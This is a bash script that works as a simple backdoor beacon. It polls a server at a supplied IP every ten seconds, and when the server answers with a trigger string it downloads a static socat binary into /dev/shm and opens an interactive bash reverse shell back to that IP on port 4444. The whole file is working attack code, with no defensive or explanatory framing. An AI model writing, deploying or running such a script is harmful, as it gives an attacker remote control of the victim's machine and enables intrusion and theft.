#!/bin/bash


IP=$1

REVERSE_SHELL_CODE="Hello World!"

while true; do
    echo  "http://$IP:6969"
    RESPONSE=$(curl -s http://$IP:6969)
    if [[ $RESPONSE == "" ]]; then
        echo "server down."
    else
        if [[ $RESPONSE == $REVERSE_SHELL_CODE ]]; then
            echo "STARTING REVERSE SHELL"
            # One liner to get socat and create a reverse shell
            wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:4444
        else
            echo $RESPONSE
            echo "something else"
        fi
    fi
    sleep 10 
done

